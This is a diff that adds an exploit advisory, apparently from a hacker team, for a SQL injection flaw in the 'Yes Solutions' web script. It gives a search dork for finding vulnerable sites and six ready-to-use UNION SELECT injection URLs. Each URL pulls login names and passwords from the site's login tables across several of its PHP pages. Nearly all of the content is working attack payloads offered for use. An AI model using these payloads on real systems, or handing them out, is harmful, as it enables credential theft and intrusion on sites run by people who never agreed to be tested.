@@ -1,0 +1,45 @@
+####################################################################
+.:. Author : HackXBack [h-b@usa.com] Lebanese Hacker
+
+.:. Team : Sec Attack Team
+.:. Home : www.sec-attack.com/vb
+.:. Script : YES SOLUTIONS [http://www.yessolutions.biz/files/index.php]
+
+.:. Bug Type : Sql Injection
+.:. Dork : "Powered by: Yes Solutions"
+
+####################################################################
+
+===[ Exploit ]===
+
+http://server/path/file.php?id=null[SQL]
+
+
+
+
+
+===[ Example ]===
+
+http://site.com/files/services.php?id=-34%20union%20select%201,2,concat%28login,0x3a,password%29,4,5,6+from+login_table+where%20login_id=1
+
+http://site.com/latest_news.php?id=-3%20union%20select%201,group_concat%28username,0x3a,password%29,3,4,5,6,7,8+from+login
+
+http://site.com/files/company.php?cat_id=-2%20union%20select%201,group_concat%28Login_Name,0x3a,Password%29,3,4,5,6,7,8+from+login_table
+
+http://site.com/files/product_detail.php?item_id=-122%20union%20select%201,2,3,group_concat%28Login_Name,0x3a,Password%29,5,6,7,8,9+from+login_table
+
+http://site.com/files/product.php?cat_id=-29 union select 1,group_concat(login,0x3a,password),3,4,5,6,7+from+login_table
+
+http://site.com/files/detail.php?id=34&page_id=-3%20union%20select%201,group_concat%28login,0x3a,password%29,3,4,5,6+from+login_table
+
+
+
+
+
+
+
+
+
+
+
+####################################################################
